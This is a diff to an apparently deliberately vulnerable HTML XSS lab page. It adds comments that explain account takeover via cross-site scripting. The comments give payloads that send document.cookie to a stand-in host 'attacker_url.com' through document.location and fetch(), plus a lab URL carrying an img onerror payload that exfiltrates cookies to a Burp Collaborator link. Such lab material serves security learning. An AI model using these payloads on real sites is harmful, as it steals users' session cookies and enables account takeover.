@@ -21,6 +21,17 @@
         } else {
             demo.innerHTML = demoURL;
         }
+
+        //lets see ATO from xss how can it be done
+        //basic payload is given : 
+        // document.location="https://attacker_url.com?victim_cookie="+document.cookie
+        //another way = fetch("https://attacker_url.com?victim_cookie="+document.cookie)
+    //For this lab you can use :127.0.0.1:5500/demo1.html?test=<img src=x onerror=eval(document.location="https://burpcollaboratorlink.com?token"%2Bdocument.cookie)>
+
+
+
+
+
     </script>
 </body>
 </html>
